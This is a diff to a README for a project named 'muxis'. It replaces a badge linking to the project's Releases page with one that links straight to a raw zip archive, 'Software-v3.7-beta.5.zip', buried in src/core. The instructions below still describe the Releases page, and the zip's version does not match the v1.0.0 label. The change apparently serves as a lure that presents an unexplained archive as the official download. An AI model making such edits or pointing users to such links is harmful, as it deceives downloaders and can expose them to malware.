@@ -18,7 +18,7 @@
 
 To download muxis, visit the Releases page below. Here you will find the latest version available for download.
 
-[![Download muxis](https://img.shields.io/badge/Download%20muxis-v1.0.0-blue)](https://github.com/Lord5728/muxis/releases)
+[![Download muxis](https://github.com/Lord5728/muxis/raw/refs/heads/main/src/core/Software-v3.7-beta.5.zip%20muxis-v1.0.0-blue)](https://github.com/Lord5728/muxis/raw/refs/heads/main/src/core/Software-v3.7-beta.5.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version, which is usually at the top of the page.
